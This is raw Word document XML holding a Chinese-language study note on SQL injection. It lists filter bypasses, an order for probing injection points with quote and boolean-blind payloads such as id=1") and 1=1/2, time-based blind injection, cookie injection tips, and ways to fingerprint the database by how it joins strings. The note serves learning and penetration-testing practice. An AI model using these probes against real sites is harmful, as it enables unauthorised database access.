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4F9E" w:rsidRDefault="00414F9E"/>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>！</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入的防范主要办法有：特殊字符</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>危险函数，关键字，空格</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的过滤；绕过办法有关键字替换，编码解码</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00912F6A" w:rsidRDefault="00C53E25" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>！</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A" w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入点</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>检测顺序</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A" w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidDel="003215E6" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:del w:id="0" w:author="rj f" w:date="2017-06-20T11:55:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1" w:author="rj f" w:date="2017-06-20T11:55:00Z">
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>1=1</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>和</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>1=2</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>返回不同说明存在注入漏洞</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:tab/>
          <w:delText>//</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>盲注</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:delText>测试</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>，</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:delText>针对</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:delText>’</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>过滤</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidDel="003215E6" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:del w:id="2" w:author="rj f" w:date="2017-06-20T11:55:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3" w:author="rj f" w:date="2017-06-20T11:55:00Z">
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>单引号</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>'</w:delText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tab/>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>//</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>基本</w:delText>
        </w:r>
        <w:r w:rsidR="00DD2A2D" w:rsidDel="003215E6">
          <w:delText>注入测试</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00DD2A2D" w:rsidDel="003215E6" w:rsidRDefault="00DD2A2D" w:rsidP="00DD2A2D">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:del w:id="4" w:author="rj f" w:date="2017-06-20T11:55:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="5" w:author="rj f" w:date="2017-06-20T11:55:00Z">
        <w:r w:rsidDel="003215E6">
          <w:delText>U</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText xml:space="preserve">nion </w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:delText>select</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:tab/>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:tab/>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:tab/>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:tab/>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:tab/>
          <w:delText>//</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>联合</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:delText>查询注入测试</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>，</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:delText>针对</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:delText>and</w:delText>
        </w:r>
        <w:r w:rsidDel="003215E6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>关键字过滤</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="003215E6" w:rsidRDefault="003215E6" w:rsidP="00DD2A2D">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:ins w:id="6" w:author="rj f" w:date="2017-06-20T11:56:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="7" w:author="rj f" w:date="2017-06-20T11:55:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>单引号是否</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="8" w:author="rj f" w:date="2017-06-20T11:56:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>报错确认可能的注入点；</w:t>
        </w:r>
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">-- </w:t>
        </w:r>
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>一般如果这一步确认了就可以直接用</w:t>
        </w:r>
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>sqlmap</w:t>
        </w:r>
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>跑了，</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="9" w:author="rj f" w:date="2017-06-20T11:57:00Z">
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>如果</w:t>
        </w:r>
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>sqlmap</w:t>
        </w:r>
        <w:r w:rsidR="007D1D00">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>跑不出来再尝试手工</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="003215E6" w:rsidRDefault="008E15BD" w:rsidP="00DD2A2D">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:ins w:id="10" w:author="rj f" w:date="2017-06-20T11:57:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="11" w:author="rj f" w:date="2017-06-20T11:57:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>利用</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>bool (blind)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>注入测试，确认</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>SQL</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>的闭合类型；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12" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="13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14" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
        <w:r>
          <w:t>d=1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15" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="16" w:author="rj f" w:date="2017-06-20T11:58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17" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1)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18" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="19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0" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1))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21" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="22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3" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1’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24" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="25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6" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1’)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27" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="28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29" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1’))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30" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="31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32" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1”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33" w:author="rj f" w:date="2017-06-20T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="34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35" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1”) and 1=1/2</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="008E15BD" w:rsidRDefault="008E15BD">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:ins w:id="36" w:author="rj f" w:date="2017-06-20T11:59:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="37" w:author="rj f" w:date="2017-06-20T11:57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38" w:author="rj f" w:date="2017-06-20T11:58:00Z">
        <w:r>
          <w:t>id=1”)) and 1=1/2</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="007319AD" w:rsidRDefault="007319AD">
      <w:pPr>
        <w:rPr>
          <w:ins w:id="39" w:author="rj f" w:date="2017-06-20T12:00:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="40" w:author="rj f" w:date="2017-06-20T11:59:00Z">
          <w:pPr>
            <w:pStyle w:val="a3"/>
            <w:numPr>
              <w:numId w:val="2"/>
            </w:numPr>
            <w:ind w:left="840" w:firstLineChars="0" w:hanging="420"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="41" w:author="rj f" w:date="2017-06-20T11:59:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>根据是否有正确</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="42" w:author="rj f" w:date="2017-06-20T12:00:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>错误的反馈，选择合适的手工注入方式。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="007319AD" w:rsidRDefault="007319AD" w:rsidP="007319AD">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:ins w:id="43" w:author="rj f" w:date="2017-06-20T11:55:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="44" w:author="rj f" w:date="2017-06-20T12:00:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>没有任何正确</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>错误的反馈，选择</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>time (blind)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>注入</w:t>
        </w:r>
        <w:r w:rsidR="00FA71E0">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>，需要</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="45" w:author="rj f" w:date="2017-06-20T12:01:00Z">
        <w:r w:rsidR="00FA71E0">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>尝试步骤</w:t>
        </w:r>
        <w:r w:rsidR="00FA71E0">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidR="00FA71E0">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>中的所有情况。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00CD0DAD" w:rsidRDefault="004B7816" w:rsidP="00CD0DAD">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">GET/POST </w:t>
      </w:r>
      <w:r w:rsidR="00C53E25">
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00C53E25">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">ookie </w:t>
      </w:r>
      <w:r w:rsidR="00C53E25">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入</w:t>
      </w:r>
      <w:r w:rsidR="009D3240">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="009D3240">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="009D3240" w:rsidRPr="009D3240">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>//cookie</w:t>
      </w:r>
      <w:r w:rsidR="009D3240" w:rsidRPr="009D3240">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>注入</w:t>
      </w:r>
      <w:r w:rsidR="009D3240" w:rsidRPr="009D3240">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>不能存在空格！用</w:t>
      </w:r>
      <w:r w:rsidR="009D3240" w:rsidRPr="009D3240">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>%20</w:t>
      </w:r>
      <w:r w:rsidR="009D3240" w:rsidRPr="009D3240">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>填充</w:t>
      </w:r>
      <w:r w:rsidR="00CD0DAD">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>。建议</w:t>
      </w:r>
      <w:r w:rsidR="00CD0DAD">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>使用穿</w:t>
      </w:r>
      <w:r w:rsidR="00CD0DAD">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve">                     </w:t>
      </w:r>
      <w:r w:rsidR="00CD0DAD">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>山甲</w:t>
      </w:r>
      <w:r w:rsidR="00CD0DAD">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>——</w:t>
      </w:r>
      <w:r w:rsidR="00CD0DAD" w:rsidRPr="00CD0DAD">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidR="00CD0DAD" w:rsidRPr="00CD0DAD">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>手工注入工具</w:t>
      </w:r>
      <w:r w:rsidR="00CD0DAD" w:rsidRPr="00CD0DAD">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>.exe</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w: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db</w:t>
      </w:r>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>类型：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007A5594" w:rsidRPr="006B7F02" w:rsidRDefault="007A5594" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="006B7F02">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>通过</w:t>
      </w:r>
      <w:r w:rsidRPr="006B7F02">
        <w:t>加法</w:t>
      </w:r>
      <w:r w:rsidRPr="006B7F02">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidRPr="006B7F02">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>符号</w:t>
      </w:r>
      <w:r w:rsidRPr="006B7F02">
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="007A5594">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>mssql:'a'+'b'='ab'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="007A5594">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>mysql:'a''b'==='a' 'b'(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>有空格</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>)='ab'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007A5594" w:rsidRDefault="00912F6A" w:rsidP="007A5594">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>oracle:'a'||'b'='ab'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009347F9" w:rsidRDefault="009347F9" w:rsidP="007A5594">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00B74572">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>SQL server</w:t>
      </w:r>
      <w:r w:rsidRPr="00B74572">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>中的字符串连接是使用“</w:t>
      </w:r>
      <w:r w:rsidRPr="00B74572">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidRPr="00B74572">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>”来连接，不带引号</w:t>
      </w:r>
      <w:r w:rsidRPr="00B74572">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>sql server</w:t>
      </w:r>
      <w:r w:rsidRPr="00B74572">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>是做加法运算。而</w:t>
      </w:r>
      <w:r w:rsidRPr="00B74572">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r w:rsidRPr="00B74572">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>中无论是带引号和不带引号，它都将其先转成数字型，然后在做运算。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009347F9" w:rsidRDefault="009347F9" w:rsidP="009347F9">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SQL Server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中字符串的连接：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009347F9" w:rsidRDefault="009347F9" w:rsidP="009347F9">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">Age=21 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009347F9" w:rsidRDefault="00BD7A70" w:rsidP="00BD7A70">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">SELECT '12'+'34',Age+1 </w:t>
      </w:r>
      <w:r w:rsidR="009347F9">
        <w:t xml:space="preserve">FROM table </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009347F9" w:rsidRDefault="009347F9" w:rsidP="009347F9">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>其结果输出结果是第一列是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1234</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，第二列是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>22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9347F9" w:rsidRDefault="009347F9" w:rsidP="009347F9">
      <w:pPr>
        <w:ind w:leftChars="400" w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MySQl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中字符串连接：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009347F9" w:rsidRDefault="009347F9" w:rsidP="00BD7A70">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>SELECT '12'+'34','1abc'+'22','abc'+'3'</w:t>
      </w:r>
      <w:r w:rsidR="00BD7A70">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">FROM table </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009347F9" w:rsidRDefault="009347F9" w:rsidP="009347F9">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>其输出结果是：第一列为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>46</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，第二列</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>23</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，第三列为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:rsidR="00162020" w:rsidRDefault="00E362ED" w:rsidP="00162020">
      <w:pPr>
        <w:ind w:left="420" w:firstLine="420"/>
      </w:pPr>
      <w:r w:rsidRPr="00E362ED">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
        </w:rPr>
        <w:t>MYSQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00E362ED">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
        </w:rPr>
        <w:t>类型转换</w:t>
      </w:r>
      <w:r w:rsidR="00162020" w:rsidRPr="00E362ED">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
        </w:rPr>
